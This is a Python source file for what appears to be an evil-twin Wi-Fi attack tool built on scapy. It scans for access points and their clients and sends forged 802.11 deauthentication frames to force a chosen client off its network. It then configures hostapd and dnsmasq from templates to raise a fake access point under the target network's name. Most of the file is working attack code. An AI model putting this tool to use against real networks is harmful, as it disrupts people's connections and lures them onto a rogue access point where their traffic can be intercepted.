from manager import print_regular
from manager import print_header
from manager import print_errors
from manager import bash
from manager import search
from manager import channel_changing
from manager import exit_and_cleanup
from manager import monitor_mode
from manager import Fore
from string import Template
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth

ap_list = []
client_list = []
ap_mac = ''


def finding_networks(pkt):
    """
    uses for scapy.sniff function.
    the function check if there is a valid mac address in the pkt
    using haslayer() and Dot11Beacon.
    https://stackoverflow.com/questions/42918505/how-to-get-mac-address-of-connected-access-point
    :param pkt: the packet that is sniffer catch
    :return: void
    """

    if pkt.haslayer(Dot11Beacon):  # there is a valid mac address in the pkt.
        mac_address = pkt[Dot11].addr2
        ap_name = pkt[Dot11Elt].info.decode()
        if mac_address not in [x[1] for x in ap_list[0:]]:
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            ap_list.append([ap_name, mac_address, channel])
            print_regular('Found new Access Point : SSID = {} , MAC = {}'.format(ap_name, mac_address))


def finding_clients_using_ap_mac(pkt):
    """
        uses for scapy.sniff function. This function gets a packet and check wether the packet includes the AP mac address
        , if so the function will save the client information into a global list
        :param pkt: the packet that is sniffer catch
        :return: void
    """
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        print(pkt.addr1)
        if pkt.addr1 not in client_list and pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3 and pkt.addr1:
            client_list.append(pkt.addr1)
            print_regular('Found new Client : MAC = {}'.format(pkt.addr1))


def deauthentication_attack(client_mac, access_point_mac, interface):
    """
    Create two packets , one fake packet that will send from the Device to the AP
    and request to disconnect from the AP, and other packet that will send from the AP to the Device ,
    each packet is deauthentication packet.
    :param client_mac represent the client mac address
    :param access_point_mac represent the access point mac address
    :param interface represent the interface that sending the packets
    https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
    """

    client_receive_packet = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac,
                                               addr3=access_point_mac) / Dot11Deauth()
    access_point_receive_packet = RadioTap() / Dot11(addr1=access_point_mac, addr2=client_mac,
                                                     addr3=client_mac) / Dot11Deauth()
    sendp(client_receive_packet, count=100, iface=interface)
    sendp(access_point_receive_packet, count=100, iface=interface)


def get_ap(index: int):
    index = int(index)
    if index in range(len(ap_list)):
        return ap_list[index]
    return None


def get_client(index: int):
    index = int(index)
    if int(index) in range(len(client_list)):
        return client_list[index]
    return None


class Attack:

    def __init__(self):
        """
        prepare the environment - stop all the running network processes
        """
        print_header('Prepare the Attack')
        bash('service NetworkManager stop')
        bash('airmon-ng check kill')
        output = os.popen('iwconfig').read()
        print(output)  # display the interfaces
        self.sniffer = 'invalid'
        self.ap = 'invalid'
        while self.sniffer == 'invalid':
            user_input = input('Please enter the interface name that will be used for sniffing , for example '
                               '\"wlan0\" \n')
            self.sniffer = user_input if search(user_input, output) else 'invalid'
            print_regular('Great! Sniffer interface is {}\n'.format(self.sniffer)) if search(user_input,
                                                                                             output) else print_errors(
                'The interface {} is not part of the list, Please insert one of the interfaces above {}\n'.format(
                    user_input, Fore.WHITE))

        output = os.popen('iwconfig').read()
        print(output)  # display the interfaces
        while self.ap == 'invalid':
            user_input = input('Please enter the interface name that will be used for Fake Access Point , for example '
                               '\"wlan1\" \n')
            self.ap = user_input if search(user_input, output) else 'invalid'
            print_regular(
                'Great! Fake Access Point interface is {}\n'.format(self.ap)) if search(user_input,
                                                                                        output) else print_errors(
                'The interface {} is not part of the list, Please insert one of the interfaces above {} \n'.format(
                    user_input, Fore.WHITE))

        print_regular('change {} interface to monitor mode'.format(self.sniffer))
        monitor_mode(self.sniffer)

    def get_ap_index(self):
        channel_thread = Thread(target=channel_changing, args=(self.sniffer, 15), daemon=True)
        channel_thread.start()
        print_regular('Start Scanning networks , this may take a while...')
        try:
            sniff(prn=finding_networks, iface=self.sniffer, timeout=15)
        except UnicodeDecodeError as e:
            print('Exception: in function {}'.format(self.get_ap_index.__name__), e)
        channel_thread.join()  # waiting for channel switching to end

        print_header('Networks')
        if len(ap_list) > 0:
            for index in range(len(ap_list)):
                print_regular('[{}] AP Name = {}  MAC Address = {}'.format(index, ap_list[index][0], ap_list[index][1]))
            index = -1
            while index == -1:
                index = input('Please Choose the Network you want to perform an attack on , if you want to explore '
                              'more network Please type \'Rescan\' for a new networks scan\n')
                if index == 'Rescan':
                    return self.get_ap_index()
                elif index in range(len(ap_list)):
                    print_errors('Not a valid option please select one of the networks mentioned above')
                    index = -1
            return index
        else:
            choice = input('No Networks were found , for rescan type \'Rescan\' , to quit type \'quit\' \n')
            if choice == 'Rescan':
                return self.get_ap_index()
            elif choice == 'quit':
                exit_and_cleanup(0, 'GoodBye')

    def get_client_index(self, ap):
        channel_thread = Thread(target=channel_changing, args=(self.sniffer, 30, ap[2]), daemon=True)
        channel_thread.start()
        print_regular('Start Scanning clients , this may take a while...')
        global ap_mac
        ap_mac = ap[1]
        try:
            sniff(prn=finding_clients_using_ap_mac, iface=self.sniffer, timeout=100)
        except UnicodeDecodeError as e:
            print('Exception: in function {}'.format(self.get_ap_index.__name__), e)
        channel_thread.join()  # waiting for channel switching to end
        print_header('Clients')
        if len(client_list) > 0:
            for index in range(len(client_list)):
                print_regular('[{}] MAC Address = {}'.format(index, client_list[index]))
            index = -1
            while index == -1:
                index = input('Please Choose the client you want to perform an attack on , if you want to explore '
                              'more clients Please type \'Rescan\' for a new clients scan\n')
                if index == 'Rescan':
                    return self.get_client_index(ap)
                elif index in range(len(client_list)):
                    print_errors('Not a valid option please select one of the networks mentioned above')
                    index = -1
            return index
        else:
            choice = input('No Clients were found , for rescan type \'Rescan\' , to quit type \'quit\' \n')
            if choice == 'Rescan':
                return self.get_client_index(ap)
            elif choice == 'quit':
                exit_and_cleanup(0, 'GoodBye')

    def deauthentication_attack(self, client_mac, access_point_mac):
        print(access_point_mac)
        print(client_list)
        deauthentication_attack_thread = Thread(target=deauthentication_attack,
                                                args=(client_mac, access_point_mac, self.sniffer))
        deauthentication_attack_thread.start()
        print_regular('deauthentication attack start , This may take a while , Please wait....')
        deauthentication_attack_thread.join()

    def create_fake_access_point(self, access_point_bssid):
        self.prepare_fake_access_point(access_point_bssid)

    def prepare_fake_access_point(self, access_point_bssid):
        bash('cp -r Templates build')
        with open('build/hostapd.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.sniffer, NETWORK=access_point_bssid))
            f.truncate()
        with open('build/dnsmasq.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.sniffer))
            f.truncate()
        with open('build/prepareAP.sh', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.sniffer))
            f.truncate()

        bash('sudo sh build/prepareAP.sh')
